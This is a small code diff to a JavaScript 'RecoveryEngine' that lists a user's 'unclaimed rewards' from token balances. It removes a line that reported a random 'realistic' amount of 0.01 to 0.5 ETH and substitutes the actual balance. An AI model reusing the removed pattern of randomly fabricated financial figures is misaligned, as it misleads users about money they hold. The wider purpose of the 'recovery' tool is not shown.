@@ -128,8 +128,8 @@ class RecoveryEngine {
         
         // Only add if there's ACTUAL balance > 0.001 tokens AND user has gas
         if (tokenAmount > 0.001) {
-          // Use realistic smaller amounts (0.01 to 0.5 ETH equivalent)
-          const realisticAmount = Math.min(tokenAmount, 0.01 + Math.random() * 0.49);
+          // Use actual token balance as recovery amount
+          const realisticAmount = tokenAmount;
           
           rewards.push({
             type: 'unclaimed_reward',
